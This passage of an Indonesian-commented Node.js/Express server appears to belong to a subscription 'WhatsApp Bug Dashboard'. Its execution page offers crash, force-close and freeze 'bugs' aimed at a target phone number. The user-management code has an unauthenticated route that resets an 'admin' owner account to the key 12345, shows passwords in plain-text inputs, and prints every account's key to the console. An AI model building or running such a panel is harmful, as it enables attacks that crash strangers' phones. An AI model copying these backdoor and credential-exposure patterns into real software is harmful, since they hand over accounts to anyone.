    <a href="/userlist" class="btn-back">
      <i class="fas fa-arrow-left"></i> RE-SYNC DATABASE
    </a>
  </div>

</body>
</html>
    `;
    return res.send(errorHtml);
  }

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒

  // 1. Tidak bisa edit akun sendiri
  if (targetUsername === currentUsername) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  // 2. Reseller hanya boleh edit user biasa
  if (role === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  // 3. Admin tidak boleh edit admin lain ATAU owner
  if (role === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa edit admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa edit owner.");
    }
  }

  // 4. Owner bisa edit semua kecuali diri sendiri (sudah dicek di atas)

  // 🔒 Tentukan opsi role yang boleh diedit
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user" ${targetUser.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${targetUser.role === "reseller" ? 'selected' : ''}>Reseller</option>
      <option value="admin" ${targetUser.role === "admin" ? 'selected' : ''}>Admin</option>
      <option value="owner" ${targetUser.role === "owner" ? 'selected' : ''}>Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user" ${targetUser.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${targetUser.role === "reseller" ? 'selected' : ''}>Reseller</option>
    `;
  } else {
    // Reseller tidak bisa edit role
    roleOptions = `<option value="${targetUser.role}" selected>${targetUser.role.charAt(0).toUpperCase() + targetUser.role.slice(1)}</option>`;
  }

  const now = Date.now();
  const sisaHari = Math.max(0, Math.ceil((targetUser.expired - now) / 86400000));
  const expiredText = new Date(targetUser.expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit"
  });

  // HTML form edit user dengan tombol yang sudah dirapihin untuk mobile
  const html = `
  <!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Edit User - DIGITAL CORE</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@500;600;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    
    <style>
        :root {
            /* Tema Lime Apple Green */
            --primary: #32CD32; /* Lime Green */
            --accent: #adff2f;  /* Green Yellow */
            --danger: #ff453a;
            --glass: rgba(255, 255, 255, 0.03);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background: #050505;
            color: #FFFFFF;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            /* Background Glow Hijau */
            background-image: 
                radial-gradient(circle at 50% -20%, rgba(50, 205, 50, 0.15) 0%, transparent 50%);
        }

        #particles {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            z-index: 0;
            opacity: 0.4;
        }

        .content {
            position: relative;
            z-index: 2;
            width: 100%;
            max-width: 480px;
            animation: fadeInUp 0.8s ease-out;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h2 {
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 32px;
            letter-spacing: 4px;
            background: linear-gradient(to right, #fff, var(--primary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
            filter: drop-shadow(0 0 10px rgba(50, 205, 50, 0.3));
        }

        .header p {
            color: rgba(255, 255, 255, 0.5);
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        /* PREMIUM FORM CONTAINER */
        .form-container {
            background: rgba(15, 15, 15, 0.6);
            backdrop-filter: blur(25px) saturate(200%);
            -webkit-backdrop-filter: blur(25px) saturate(200%);
            border: 1px solid var(--glass-border);
            padding: 30px;
            border-radius: 35px;
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.7);
            position: relative;
            overflow: hidden;
        }

        .form-container::before {
            content: "";
            position: absolute;
            top: 0; left: 50%;
            transform: translateX(-50%);
            width: 60%; height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary), transparent);
        }

        /* USER INFO DECK */
        .user-info {
            background: rgba(255, 255, 255, 0.03);
            padding: 20px;
            border-radius: 20px;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            font-size: 13px;
            font-family: 'Rajdhani', sans-serif;
        }

        .info-label { color: rgba(255, 255, 255, 0.4); text-transform: uppercase; letter-spacing: 1px; }
        .info-value { color: #FFFFFF; font-weight: 600; letter-spacing: 0.5px; }

        /* BADGES HIJAU */
        .role-badge {
            padding: 4px 12px;
            border-radius: 8px;
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            box-shadow: 0 0 15px rgba(0,0,0,0.3);
        }

        .role-owner { background: linear-gradient(45deg, #FFD700, #FFA500); color: #000; }
        .role-admin { background: linear-gradient(45deg, #FF4B2B, #FF416C); color: #fff; }
        .role-reseller { background: linear-gradient(45deg, #32CD32, #228B22); color: #fff; }
        .role-user { background: linear-gradient(45deg, #adff2f, #32CD32); color: #fff; }

        .form-group { margin-bottom: 22px; }

        label {
            display: block;
            margin-left: 10px;
            margin-bottom: 8px;
            font-weight: 600;
            color: var(--primary);
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            font-family: 'Orbitron', sans-serif;
        }

        /* LUXURY INPUTS */
        input, select {
            width: 100%;
            padding: 16px 20px;
            border-radius: 18px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            background: rgba(255, 255, 255, 0.04);
            color: #FFFFFF;
            font-size: 15px;
            transition: all 0.3s ease;
            font-family: 'Poppins', sans-serif;
        }

        input:focus, select:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.08);
            border-color: var(--primary);
            box-shadow: 0 0 15px rgba(50, 205, 50, 0.2);
        }

        /* BUTTONS */
        .button-group {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 30px;
        }

        .btn {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 20px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 12px;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            text-transform: uppercase;
        }

        .btn:active { transform: scale(0.96); }

        .btn-save {
            background: linear-gradient(45deg, #fff, #f0f0f0);
            color: #000;
            box-shadow: 0 10px 20px rgba(255, 255, 255, 0.1);
        }

        .btn-save:hover {
            background: var(--primary);
            color: #000;
            box-shadow: 0 15px 30px rgba(50, 205, 50, 0.3);
            transform: translateY(-2px);
        }

        .btn-delete {
            background: rgba(255, 69, 58, 0.05);
            color: var(--danger);
            border: 1px solid rgba(255, 69, 58, 0.2);
        }

        .btn-delete:hover {
            background: var(--danger);
            color: #fff;
            box-shadow: 0 10px 20px rgba(255, 69, 58, 0.3);
        }

        .btn-back {
            background: transparent;
            color: rgba(255, 255, 255, 0.4);
            font-size: 10px;
            border: 1px solid rgba(255,255,255,0.05);
            text-decoration: none;
        }

        .btn-back:hover {
            color: #fff;
            background: rgba(255,255,255,0.05);
            border-color: #fff;
        }

        .warning-text { color: var(--danger) !important; text-shadow: 0 0 10px rgba(255, 69, 58, 0.4); }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
    </style>
</head>
<body>
    <div id="particles"></div>

    <div class="content">
        <div class="header">
            <h2>EDIT MODULE</h2>
            <p>Access Level: System Administrator</p>
        </div>

        <div class="form-container">
            <div class="user-info">
                <div class="info-row">
                    <span class="info-label">Identity:</span>
                    <span class="info-value">${targetUser.username}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Current Tier:</span>
                    <span class="info-value">
                        <span class="role-badge role-${targetUser.role}">
                            ${targetUser.role.charAt(0).toUpperCase() + targetUser.role.slice(1)}
                        </span>
                    </span>
                </div>
                <div class="info-row">
                    <span class="info-label">Termination Date:</span>
                    <span class="info-value">${expiredText}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Active Status:</span>
                    <span class="info-value ${sisaHari <= 7 ? 'warning-text' : ''}">${sisaHari} Cycles Left</span>
                </div>
            </div>

            <form method="POST" action="/edituser">
                <input type="hidden" name="oldusername" value="${targetUser.username}">
                
                <div class="form-group">
                    <label><i class="fas fa-fingerprint"></i> New Identity</label>
                    <input type="text" name="username" value="${targetUser.username}" required>
                </div>

                <div class="form-group">
                    <label><i class="fas fa-terminal"></i> Access Code</label>
                    <input type="text" name="password" value="${targetUser.key}" required>
                </div>

                <div class="form-group">
                    <label><i class="fas fa-hourglass-half"></i> Extend Lifespan (Days)</label>
                    <input type="number" name="extend" min="0" max="365" placeholder="0" value="0">
                </div>

                <div class="form-group">
                    <label><i class="fas fa-shield-halved"></i> Security Protocol</label>
                    <select name="role" ${role === 'reseller' ? 'disabled' : ''}>
                        ${roleOptions}
                    </select>
                    ${role === 'reseller' ? '<input type="hidden" name="role" value="' + targetUser.role + '">' : ''}
                </div>

                <div class="button-group">
                    <button type="submit" class="btn btn-save">
                        <i class="fas fa-save"></i> Commit Changes
                    </button>

                    <button type="button" class="btn btn-delete" onclick="handleDelete()">
                        <i class="fas fa-trash-can"></i> Purge User
                    </button>

                    <a href="/userlist" class="btn btn-back">
                        <i class="fas fa-arrow-left"></i> Abort & Return
                    </a>
                </div>
            </form>
        </div>
    </div>

    <form id="deleteForm" method="POST" action="/hapususer" style="display: none;">
        <input type="hidden" name="username" value="${targetUser.username}">
    </form>

    <script>
        $(document).ready(function() {
            $('#particles').particleground({
                dotColor: '#1a4d1a', /* Hijau tua sesuai tema */
                lineColor: '#1a4d1a',
                density: 10000,
                proximity: 100
            });
        });

        function handleDelete() {
            if (confirm('Critical Warning: Are you sure you want to purge user ${targetUser.username}? This action is irreversible.')) {
                document.getElementById('deleteForm').submit();
            }
        }
    </script>
</body>
</html>
  `;
  res.send(html);
});

// user profile new


// Tambahkan ini setelah route GET /edituser
app.post("/edituser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const sessionRole = currentUser.role || 'user';
  const sessionUsername = username;
  const { oldusername, username: newUsername, password, role, extend } = req.body;

  // Validasi input
  if (!oldusername || !newUsername || !password || !role) {
    return res.send("❌ Semua field harus diisi.");
  }

  // Cari user yang akan diedit
  const targetUserIndex = users.findIndex(u => u.username === oldusername);
  if (targetUserIndex === -1) {
    return res.send("❌ User tidak ditemukan.");
  }

  const targetUser = users[targetUserIndex];

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒

  // 1. Tidak bisa edit akun sendiri
  if (sessionUsername === oldusername) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  // 2. Reseller hanya boleh edit user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  // 3. Admin tidak boleh edit admin lain ATAU owner
  if (sessionRole === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa edit admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa edit owner.");
    }
  }

  // 4. Owner bisa edit semua kecuali diri sendiri (sudah dicek di atas)

  // Update data user
  users[targetUserIndex] = {
    ...users[targetUserIndex],
    username: newUsername,
    key: password,
    role: role
  };

  // Tambah masa aktif jika ada
  if (extend && parseInt(extend) > 0) {
    users[targetUserIndex].expired += parseInt(extend) * 86400000;
  }

  saveUsers(users);

  // Redirect ke userlist dengan pesan sukses
  res.redirect("/userlist?msg=User " + newUsername + " berhasil diupdate");
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

// === ROUTE BANTUAN LOGIN MANUAL ===
app.get("/emergency-user", (req, res) => {
  const users = getUsers();
  // Buat user admin default
  const emergencyUser = {
    username: "admin",
    key: "12345",
    role: "owner",
    expired: Date.now() + (365 * 24 * 60 * 60 * 1000) // 1 tahun
  };

  // Update atau tambah user admin
  const index = users.findIndex(u => u.username === "admin");
  if (index !== -1) users[index] = emergencyUser;
  else users.push(emergencyUser);

  saveUsers(users);
  res.send(`✅ <b>User Darurat Berhasil Dibuat!</b><br><br>Username: <b>admin</b><br>Key: <b>12345</b><br><br>👉 <a href="/login">KLIK DISINI UNTUK LOGIN</a>`);
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);

  // Tampilkan semua akun di console agar bisa login manual
  const users = getUsers();
  console.log('\n╔══════════════════════════════════════════════════════════════╗');
  console.log('║              🔐 DAFTAR AKUN UNTUK LOGIN MANUAL               ║');
  console.log('╠══════════════════════════════════════════════════════════════╣');
  if (users.length === 0) console.log('║ ⚠️ TIDAK ADA USER! Buka /emergency-user di browser untuk buat ║');
  users.forEach(u => console.log(`║ User: ${u.username.padEnd(12)} | Key: ${u.key.padEnd(10)} | Role: ${u.role.padEnd(8)} ║`));
  console.log('╚══════════════════════════════════════════════════════════════╝\n');
});

module.exports = {
  loadAkses,
  saveAkses,
  isOwner,
  isAuthorized,
  saveUsers,
  getUsers
};


// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  // Bug types data - Simplified titles
  const bugTypes = [
    {
      id: 'delay',
      icon: '<i class="fas fa-hourglass-half"></i>',
      title: 'Delay Invisible'
    },
    {
      id: 'crash',
      icon: '<i class="fas fa-tachometer-alt"></i>',
      title: 'Crash Android'
    },
    {
      id: 'fcandro',
      icon: '<i class="fab fa-android"></i>',
      title: 'Force Close'
    },
    {
      id: 'fcinvisios',
      icon: '<i class="fas fa-ghost"></i>',
      title: 'Invisible FC iOS'
    },
    {
      id: 'blank-ios',
      icon: '<i class="fab fa-apple"></i>',
      title: 'Crash iOS'
    },
    {
      id: 'stuck',
      icon: '<i class="fas fa-thumbtack"></i>',
      title: 'Stuck Loading'
    },
    {
      id: 'delayv2',
      icon: '<i class="fas fa-clock"></i>',
      title: 'Delay hard V2'
    },
    {
      id: 'combination',
      icon: '<i class="fas fa-compress-alt"></i>',
      title: 'COMBINATION BUGS'
    },
    {
      id: 'Trash-IOS',
      icon: '<i class="fas fa-trash-alt"></i>',
      title: 'Trash iOS'
    },
    {
      id: 'Neural-Hardcore',
      icon: '<i class="fas fa-brain"></i>',
      title: 'HARDCORE BUGS'
    },
    {
      id: 'SqL-Exception',
      icon: '<i class="fas fa-clock"></i>',
      title: 'COMBINATION BUGS'
    }
  ];

  return `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Bug Dashboard - Execution</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* ========== BAGIAN 1: EDIT MODULE PAGE ========== */
:root {
    --primary: #FF2D2D;
    --accent: #ff6b6b;
    --danger: #ff453a;
    --glass: rgba(255, 255, 255, 0.03);
    --glass-border: rgba(255, 255, 255, 0.1);
}

* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    -webkit-tap-highlight-color: transparent;
}

body {
    font-family: 'Poppins', sans-serif;
    background: #050505;
    color: #FFFFFF;
    min-height: 100vh;
    padding: 20px;
    display: flex;
    justify-content: center;
    align-items: center;
    overflow-x: hidden;
    /* Background Glow Merah */
    background-image: 
        radial-gradient(circle at 50% -20%, rgba(255, 45, 45, 0.15) 0%, transparent 50%);
}

#particles {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    z-index: 0;
    opacity: 0.4;
}

.content {
    position: relative;
    z-index: 2;
    width: 100%;
    max-width: 480px;
    animation: fadeInUp 0.8s ease-out;
}

.header {
    text-align: center;
    margin-bottom: 30px;
}

.header h2 {
    font-family: 'Orbitron', sans-serif;
    font-weight: 700;
    font-size: 32px;
    letter-spacing: 4px;
    background: linear-gradient(to right, #fff, var(--primary));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    margin-bottom: 8px;
    filter: drop-shadow(0 0 10px rgba(255, 45, 45, 0.4));
}

.header p {
    color: rgba(255, 255, 255, 0.5);
    font-size: 13px;
    text-transform: uppercase;
    letter-spacing: 2px;
}

/* PREMIUM FORM CONTAINER */
.form-container {
    background: rgba(15, 15, 15, 0.6);
    backdrop-filter: blur(25px) saturate(200%);
    -webkit-backdrop-filter: blur(25px) saturate(200%);
    border: 1px solid var(--glass-border);
    padding: 30px;
    border-radius: 35px;
    box-shadow: 0 40px 80px rgba(0, 0, 0, 0.7);
    position: relative;
    overflow: hidden;
}

.form-container::before {
    content: "";
    position: absolute;
    top: 0; left: 50%;
    transform: translateX(-50%);
    width: 60%; height: 2px;
    background: linear-gradient(90deg, transparent, var(--primary), transparent);
}

/* USER INFO DECK */
.user-info {
    background: rgba(255, 255, 255, 0.03);
    padding: 20px;
    border-radius: 20px;
    margin-bottom: 30px;
    border: 1px solid rgba(255, 45, 45, 0.1);
}

.info-row {
    display: flex;
    justify-content: space-between;
    margin-bottom: 12px;
    font-size: 13px;
    font-family: 'Rajdhani', sans-serif;
}

.info-label { color: rgba(255, 255, 255, 0.4); text-transform: uppercase; letter-spacing: 1px; }
.info-value { color: #FFFFFF; font-weight: 600; letter-spacing: 0.5px; }

/* BADGES MERAH */
.role-badge {
    padding: 4px 12px;
    border-radius: 8px;
    font-size: 10px;
    font-weight: 700;
    text-transform: uppercase;
    box-shadow: 0 0 15px rgba(0,0,0,0.3);
}

.role-owner { background: linear-gradient(45deg, #FFD700, #FFA500); color: #000; }
.role-admin { background: linear-gradient(45deg, #FF2D2D, #cc0000); color: #fff; }
.role-reseller { background: linear-gradient(45deg, #FF2D2D, #ff6b6b); color: #fff; }
.role-user { background: linear-gradient(45deg, #ff6b6b, #FF2D2D); color: #fff; }

.form-group { margin-bottom: 22px; }

label {
    display: block;
    margin-left: 10px;
    margin-bottom: 8px;
    font-weight: 600;
    color: var(--primary);
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 1.5px;
    font-family: 'Orbitron', sans-serif;
}

/* LUXURY INPUTS */
input, select {
    width: 100%;
    padding: 16px 20px;
    border-radius: 18px;
    border: 1px solid rgba(255, 255, 255, 0.08);
    background: rgba(255, 255, 255, 0.04);
    color: #FFFFFF;
    font-size: 15px;
    transition: all 0.3s ease;
    font-family: 'Poppins', sans-serif;
}

select:focus {
    outline: none;
    background: rgba(255, 255, 255, 0.08);
    border-color: var(--primary);
    box-shadow: 0 0 15px rgba(255, 45, 45, 0.25);
}

/* BUTTONS */
.button-group {
    display: flex;
    flex-direction: column;
    gap: 15px;
    margin-top: 30px;
}

.btn {
    width: 100%;
    padding: 18px;
    border: none;
    border-radius: 20px;
    font-family: 'Orbitron', sans-serif;
    font-weight: 700;
    font-size: 12px;
    letter-spacing: 2px;
    cursor: pointer;
    transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    text-transform: uppercase;
}

.btn:active { transform: scale(0.96); }

.btn-save {
    background: linear-gradient(45deg, #fff, #f0f0f0);
    color: #000;
    box-shadow: 0 10px 20px rgba(255, 255, 255, 0.1);
}

.btn-save:hover {
    background: var(--primary);
    color: #fff;
    box-shadow: 0 15px 30px rgba(255, 45, 45, 0.4);
    transform: translateY(-2px);
}

.btn-delete {
    background: rgba(255, 69, 58, 0.05);
    color: var(--danger);
    border: 1px solid rgba(255, 69, 58, 0.2);
}

.btn-delete:hover {
    background: var(--danger);
    color: #fff;
    box-shadow: 0 10px 20px rgba(255, 69, 58, 0.3);
}

.btn-back {
    background: transparent;
    color: rgba(255, 255, 255, 0.4);
    font-size: 10px;
    border: 1px solid rgba(255,255,255,0.05);
    text-decoration: none;
}

.btn-back:hover {
    color: #fff;
    background: rgba(255,255,255,0.05);
    border-color: #fff;
}

.warning-text { color: var(--danger) !important; text-shadow: 0 0 10px rgba(255, 69, 58, 0.4); }

@keyframes fadeInUp {
    from { opacity: 0; transform: translateY(30px); }
    to { opacity: 1; transform: translateY(0); }
}

/* Custom Scrollbar */
::-webkit-scrollbar { width: 5px; }
::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }


/* ========== BAGIAN 2: EXECUTION PAGE ========== */

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

:root {
    --bg-dark: #07030a;
    --card-bg: #1a0a0a; /* Dark red tint */
    --accent-pink: #FF2D2D; /* Merah utama */
    --accent-purple: #cc1a1a; /* Merah gelap */
    --text-main: #ffffff;
    --text-dim: #a1a1aa;
    --gradient-pink: linear-gradient(90deg, #FF2D2D, #ff6b6b);
    --danger-yellow: #f59e0b;
    --success-green: #10b981;
}

body {
    font-family: 'Rajdhani', sans-serif;
    background: var(--bg-dark);
    color: var(--text-main);
    padding: 20px;
    padding-bottom: 80px;
    display: flex;
    justify-content: center;
    /* Background glow merah */
    background-image: radial-gradient(circle at 50% 0%, rgba(255, 45, 45, 0.1) 0%, transparent 60%);
}

.container {
    width: 100%;
    max-width: 450px;
    display: flex;
    flex-direction: column;
    gap: 15px;
}

/* Profile Header */
.profile-card {
    background: var(--card-bg);
    border-radius: 20px;
    padding: 15px 20px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    border: 1px solid rgba(255, 45, 45, 0.2);
}

.profile-info {
    display: flex;
    align-items: center;
    gap: 15px;
}

.avatar {
    width: 45px;
    height: 45px;
    border-radius: 50%;
    border: 2px solid var(--accent-pink);
    object-fit: cover;
}

.user-meta h2 {
    font-size: 1.1rem;
    letter-spacing: 1px;
}

.role-badge {
    font-size: 9px;
    background: rgba(255, 45, 45, 0.2);
    color: #FF2D2D;
    padding: 1px 6px;
    border-radius: 4px;
    text-transform: uppercase;
    font-weight: bold;
}

.expiry-box {
    text-align: right;
    font-size: 9px;
    color: #fbbf24;
    background: rgba(0,0,0,0.3);
    padding: 4px 8px;
    border-radius: 6px;
}

/* Video MP4 Banner */
.banner-card {
    width: 100%;
    height: 170px;
    border-radius: 20px;
    overflow: hidden;
    position: relative;
    border: 1px solid rgba(255, 45, 45, 0.25);
    background: #000;
}

.banner-card video {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

/* Sound Toggle Button */
.sound-toggle {
    position: absolute;
    top: 10px;
    right: 10px;
    width: 32px;
    height: 32px;
    background: rgba(0, 0, 0, 0.6);
    border: 1px solid var(--accent-pink);
    border-radius: 50%;
    color: white;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    z-index: 10;
    transition: 0.3s;
}

.banner-overlay {
    position: absolute;
    bottom: 0;
    width: 100%;
    padding: 15px;
    background: linear-gradient(transparent, rgba(0,0,0,0.8));
    pointer-events: none;
}

.banner-text {
    font-family: 'Orbitron', sans-serif;
    font-size: 13px;
    font-weight: bold;
    color: white;
}

/* Input Labels */
.section-label {
    background: var(--gradient-pink);
    padding: 8px 15px;
    border-radius: 12px 12px 0 0;
    font-family: 'Orbitron', sans-serif;
    font-size: 13px;
    font-weight: bold;
    color: #fff;
}

.input-wrapper {
    background: var(--card-bg);
    border-radius: 0 0 15px 15px;
    padding: 18px;
    display: flex;
    align-items: center;
    gap: 15px;
    border: 1px solid rgba(255, 45, 45, 0.1);
}

.input-field {
    background: transparent;
    border: none;
    color: white;
    font-size: 15px;
    outline: none;
    width: 100%;
}

/* Custom Dropdown with Scroll */
.dropdown-container {
    position: relative;
}

.select-box {
    background: #2a0d0d;
    padding: 18px;
    border-radius: 0 0 15px 15px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    cursor: pointer;
    transition: 0.3s;
    border: 1px solid rgba(255, 45, 45, 0.08);
}

.bug-dropdown-list {
    position: absolute;
    top: 100%;
    left: 0;
    right: 0;
    background: #1a0a0a;
    margin-top: 5px;
    border-radius: 12px;
    border: 1px solid rgba(255, 45, 45, 0.35);
    z-index: 999;
    display: none;
    max-height: 200px;
    overflow-y: auto;
    box-shadow: 0 10px 25px rgba(255, 45, 45, 0.15);
}

.bug-dropdown-list.active {
    display: block;
}

.bug-dropdown-list::-webkit-scrollbar {
    width: 6px;
}
.bug-dropdown-list::-webkit-scrollbar-thumb {
    background: var(--accent-pink);
    border-radius: 10px;
}

.bug-item {
    padding: 15px;
    display: flex;
    align-items: center;
    gap: 12px;
    border-bottom: 1px solid rgba(255,255,255,0.03);
    transition: 0.2s;
}

.bug-item:hover {
    background: rgba(255, 45, 45, 0.12);
}

/* Execute Button */
.execute-btn {
    background: var(--gradient-pink);
    border: none;
    padding: 16px;
    border-radius: 12px;
    color: #fff;
    font-family: 'Orbitron', sans-serif;
    font-size: 14px;
    font-weight: bold;
    cursor: pointer;
    margin-top: 10px;
    box-shadow: 0 4px 20px rgba(255, 45, 45, 0.4);
    transition: 0.3s;
}

.execute-btn:hover {
    box-shadow: 0 6px 30px rgba(255, 45, 45, 0.6);
    transform: translateY(-1px);
}

.execute-btn:disabled {
    opacity: 0.6;
    cursor: not-allowed;
    filter: grayscale(1);
}

/* Modal / Popup Styling */
.modal-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.85);
    backdrop-filter: blur(5px);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 2000;
    padding: 20px;
}

.modal-content {
    background: var(--card-bg);
    width: 100%;
    max-width: 350px;
    border-radius: 20px;
    border: 1px solid var(--accent-pink);
    overflow: hidden;
    animation: popupAnim 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
}

@keyframes popupAnim {
    from { transform: scale(0.8); opacity: 0; }
    to { transform: scale(1); opacity: 1; }
}

.modal-header {
    background: var(--gradient-pink);
    padding: 15px;
    text-align: center;
    font-family: 'Orbitron', sans-serif;
    font-weight: bold;
    font-size: 16px;
    color: #fff;
}

.modal-body {
    padding: 20px;
    text-align: center;
    color: var(--text-dim);
    line-height: 1.6;
}

.modal-footer {
    padding: 15px;
    display: flex;
    justify-content: center;
}

.close-modal-btn {
    background: transparent;
    border: 1px solid var(--accent-pink);
    color: var(--accent-pink);
    padding: 8px 25px;
    border-radius: 10px;
    cursor: pointer;
    font-family: 'Orbitron', sans-serif;
    font-size: 11px;
}

/* Modal Variants */
.modal-content.error { border-color: var(--danger-yellow); }
.modal-content.error .modal-header { background: var(--danger-yellow); color: white; }
.modal-content.success { border-color: var(--success-green); }
.modal-content.success .modal-header { background: var(--success-green); color: white; }

/* Bottom Nav */
.bottom-nav {
    position: fixed;
    bottom: 0;
    width: 100%;
    max-width: 450px;
    background: #000;
    display: flex;
    justify-content: space-around;
    padding: 12px;
    border-top: 1px solid #1a0505;
}

.nav-item {
    text-align: center;
    font-size: 10px;
    color: #444;
    text-decoration: none;
    flex: 1;
}

.nav-item.active { color: var(--accent-pink); }
.nav-item i { display: block; font-size: 1.2rem; margin-bottom: 4px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="profile-card">
            <div class="profile-info">
                <img src="https://e.top4top.io/p_364583zcu1.jpg" class="avatar" alt="Avatar">
                <div class="user-meta">
                    <h2 id="userName">${username}</h2>
                    <span class="role-badge">ROLE VIP</span>
                </div>
            </div>
            <div class="expiry-box">EXPIRES<br><span id="expiryDate">${expired}</span></div>
        </div>

        <div class="banner-card">
            <video id="bannerVideo" autoplay muted loop playsinline>
                <source src="https://files.catbox.moe/t20goy.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
            
            <div class="sound-toggle" id="soundBtn">
                <i id="soundIcon" class="fas fa-volume-mute"></i>
            </div>

            <div class="banner-overlay">
                <div class="banner-text">NEURAL PROTOCOL<br>
                <span style="color: red; font-size: 10px;">WELCOME TO THE HELL</span></div>
            </div>
        </div>

        <div>
            <div class="section-label">Number Targets</div>
            <div class="input-wrapper">
                <i class="fas fa-mobile-alt" style="color:var(--accent-pink)"></i>
                <input type="text" id="numberInput" class="input-field" placeholder="Masukkan nomor (Contoh: 628xxx)">
            </div>
        </div>

        <div class="dropdown-container">
            <div class="section-label">Pilih Bug</div>
            <div class="select-box" id="menuToggle">
                <div style="display:flex; align-items:center; gap:10px">
                    <i class="fas fa-chart-bar" style="color:var(--accent-pink)"></i>
